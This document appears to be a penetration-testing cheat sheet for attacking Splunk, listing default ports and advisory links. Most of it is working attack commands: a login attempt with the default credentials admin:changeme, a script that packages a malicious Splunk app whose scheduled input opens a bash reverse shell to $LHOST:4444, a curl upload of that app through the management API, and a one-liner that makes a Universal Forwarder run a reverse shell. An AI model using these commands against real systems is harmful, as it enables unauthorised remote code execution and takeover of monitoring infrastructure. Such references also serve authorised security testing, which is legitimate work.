# Splunk

**What it is:** Enterprise SIEM and log analysis platform. The management interface allows installing custom apps, which can contain arbitrary Python or shell scripts. Admin access = RCE.

**Default ports:** 8000 (web), 8089 (management API)

**Vuln research:**
- [Splunk Security Advisories](https://advisory.splunk.com/)
- [SearchSploit: `searchsploit splunk`](https://www.exploit-db.com/search?q=splunk)

---

### Default credentials

Splunk free/trial often has defaults

```bash
# admin:changeme
# admin:admin
curl -u admin:changeme https://$IP:8089/services/auth/login -k
```

---

### Splunk RCE via custom app

Upload malicious app — Executes arbitrary code

```bash
# Create a malicious Splunk app:
mkdir -p splunk_shell/bin splunk_shell/default
echo '#!/bin/bash\nbash -i >& /dev/tcp/$LHOST/4444 0>&1' > splunk_shell/bin/shell.sh
chmod +x splunk_shell/bin/shell.sh

cat > splunk_shell/default/inputs.conf << CONF
[script://./bin/shell.sh]
disabled = false
interval = 60
sourcetype = shell
CONF

tar -czf splunk_shell.tar.gz splunk_shell/

# Upload via: Apps → Manage Apps → Install App from File
# Or via API:
curl -k -u admin:changeme https://$IP:8089/services/apps/local -F name=splunk_shell -F filename=true -F update=true --data-binary @splunk_shell.tar.gz
```

---

### Splunk Universal Forwarder

Management port 8089 — Often has default creds on forwarders

```bash
# Default: admin:changeme
# Forwarders can execute scripts:
curl -k -u admin:changeme https://$IP:8089/services/data/inputs/script -d name="/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" -d interval=60
```

---
